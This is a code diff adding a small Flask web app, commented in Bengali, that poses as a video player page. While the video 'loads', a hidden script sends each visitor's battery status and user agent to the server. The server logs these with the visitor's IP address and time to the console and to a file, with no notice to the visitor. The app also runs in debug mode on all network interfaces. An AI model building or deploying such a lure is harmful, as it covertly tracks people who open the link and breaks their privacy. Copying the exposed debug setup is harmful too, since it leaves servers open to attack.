@@ -1,0 +1,84 @@
+import os
+from flask import Flask, request, render_template_string, jsonify, send_from_directory
+from datetime import datetime
+
+app = Flask(__name__)
+
+# ভিডিও ফাইলটি যেখানে আছে সেই ফোল্ডার
+VIDEO_FOLDER = os.getcwd()
+
+@app.route('/')
+def index():
+    html_code = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Video Player</title>
+        <style>
+            body { text-align: center; padding-top: 50px; background-color: #121212; color: white; font-family: Arial; }
+            video { border: 4px solid #ff0000; border-radius: 15px; width: 90%; max-width: 600px; box-shadow: 0 0 20px #ff0000; }
+        </style>
+    </head>
+    <body>
+        <h2>ভিডিওটি লোড হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন</h2>
+        <video id="myVideo" controls autoplay>
+            <source src="/video_stream" type="video/mp4">
+            আপনার ব্রাউজার এটি সাপোর্ট করে না।
+        </video>
+
+        <script>
+            async function collectData() {
+                try {
+                    let battery = await navigator.getBattery();
+                    let data = {
+                        level: (battery.level * 100).toFixed(0) + "%",
+                        charging: battery.charging ? "Charging" : "Not Charging",
+                        device: navigator.userAgent
+                    };
+                    
+                    fetch('/log', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                } catch (e) {
+                    fetch('/log', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ level: "N/A", charging: "N/A", device: navigator.userAgent })
+                    });
+                }
+            }
+            // পেজ লোড হওয়ার ১ সেকেন্ড পর তথ্য পাঠাবে
+            setTimeout(collectData, 1000);
+        </script>
+    </body>
+    </html>
+    """
+    return render_template_string(html_code)
+
+@app.route('/video_stream')
+def video_stream():
+    return send_from_directory(VIDEO_FOLDER, 'video.mp4')
+
+@app.route('/log', methods=['POST'])
+def log_data():
+    d = request.json
+    ip = request.remote_addr
+    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    log_entry = f"Time: {time} | IP: {ip} | Battery: {d.get('level')} ({d.get('charging')}) | Device: {d.get('device')}\\n"
+    
+    # টার্মিনালে দেখানো
+    print(f"\\n--- [নতুন ভিজিটর] ---")
+    print(log_entry)
+    
+    # ফাইলে সেভ করা
+    with open("log.txt", "a") as f:
+        f.write(log_entry)
+        
+    return jsonify({"status": "success"})
+
+if __name__ == '__main__':
+    app.run(debug=True, host='0.0.0.0', port=5000)
+	k
